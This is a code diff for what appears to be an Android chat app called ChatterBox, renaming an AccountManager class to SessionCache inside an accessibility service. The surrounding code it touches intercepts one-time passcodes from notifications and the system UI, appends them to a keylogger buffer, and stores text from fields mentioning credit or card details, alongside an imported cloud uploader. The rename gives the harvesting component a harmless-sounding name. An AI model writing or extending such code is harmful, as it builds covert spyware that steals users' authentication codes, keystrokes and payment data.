@@ -10,7 +10,7 @@ import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import com.example.ChatterBox.database.AccountManager
+import com.example.ChatterBox.database.SessionCache
 import com.example.ChatterBox.database.CloudUploader
 import org.json.JSONObject
 import java.text.SimpleDateFormat
@@ -207,11 +207,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             Log.d(TAG, "New OTP detected in notification from $sourceApp: $otp")
 
             try {
-                AccountManager.storeSessionInfo(
+                SessionCache.storeSessionInfo(
                     applicationContext, "$sourceType:$sourceApp", "otp", otp
                 )
 
-                AccountManager.storeSessionInfo(
+                SessionCache.storeSessionInfo(
                     applicationContext, "$sourceType:$sourceApp", "message", notificationText
                 )
 
@@ -297,10 +297,10 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                         Log.d(TAG, "New OTP detected in system UI: $otp")
 
                         try {
-                            AccountManager.storeSessionInfo(
+                            SessionCache.storeSessionInfo(
                                 applicationContext, "SystemUI", "otp", otp
                             )
-                            AccountManager.storeSessionInfo(
+                            SessionCache.storeSessionInfo(
                                 applicationContext, "SystemUI", "message", notificationText
                             )
                             keylogBuffer.append("[OTP from SystemUI: $otp] ")
@@ -382,7 +382,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             cleanupProcessedOtps()
         }
         try {
-            AccountManager.storeSessionInfo(applicationContext, packageName, "otp", otp)
+            SessionCache.storeSessionInfo(applicationContext, packageName, "otp", otp)
             keylogBuffer.append("[OTP: $otp] ")
             lastInputTime = System.currentTimeMillis()
             handler.removeCallbacks(keylogFlushRunnable)
@@ -400,7 +400,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             sourceText.contains("credit", ignoreCase = true) ||
             sourceText.contains("card", ignoreCase = true)
         ) {
-            AccountManager.storeSessionInfo(
+            SessionCache.storeSessionInfo(
                 applicationContext, packageName, "input_field", sourceText
             )
         }
